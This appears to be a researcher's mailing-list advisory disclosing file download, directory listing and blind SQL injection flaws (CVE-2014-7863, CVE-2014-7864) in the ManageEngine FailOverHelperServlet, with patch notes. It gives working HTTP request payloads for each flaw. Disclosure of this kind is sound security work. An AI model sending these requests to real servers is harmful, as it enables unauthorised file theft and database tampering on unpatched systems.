# [The ManageOwnage Series, part XII]: Multiple vulnerabilities in FailOverServlet (OpManager, AppManager, IT360)

Hi,

This is part 12 of the ManageOwnage series. For previous parts, see [1].

This time we have an arbitrary file download, directory content
disclosure and blind SQL injection vulnerabilities in ManageEngine
OpManager, Applications Manager and IT360.

I've pushed two new Metasploit modules into the framework that exploit
the file download and the content disclosure [2], these should
hopefully be accepted soon.
The full advisory text is below, and as always you can get a copy from
my repo [3].

Regards,
Pedro

The affected servlet is the "FailOverHelperServlet" (affectionately
called FailServlet).
There are definitely more vulnerabilities than the ones identified
below - for example it is possible to hijack the failover operation
completely. The ones listed below as the easy ones to find and
exploit.

#1
Vulnerability: Arbitrary file download
CVE-2014-7863
Constraints: unauthenticated in OpManager and AppManager; authenticated in IT360
Affected versions: ManageEngine Applications Manager v? to v11.Y
bXXXX; ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5

POST /servlet/FailOverHelperServlet?operation=copyfile&fileName=C:\\boot.ini

#2
Vulnerability: Information disclosure - list all files in a directory
and its children
CVE-2014-7863 (same as #1)
Constraints: unauthenticated in OpManager and AppManager; authenticated in IT360
Affected versions: ManageEngine Applications Manager v? to v11.Y
bXXXX; ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5

POST /servlet/FailOverHelperServlet?operation=listdirectory&rootDirectory=C:\\

#3
Vulnerability: Blind SQL injection
CVE-2014-7864
Affected versions: ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5
Constraints: unauthenticated in OpManager; authenticated in IT360
POST
/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=standbyUpdateInCentral&customerName=[SQLi_1]&serverRole=[SQLi_2]
POST
/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=standbyUpdateInCentral&customerName=a')%3b+create+table+bacas+(bodas+text)%3b--+&serverRole=a

```

```
For Applications Manager, upgrade to version 11.9 b11912.

For OpManager, install the patch for v11.4 and 11.5:
<https://support.zoho.com/portal/manageengine/helpcenter/articles/vulnerabilities-in-failoverhelperservlet>
Version 11.6 will be released with the patch.

These vulnerabilities remain UNFIXED in IT360.
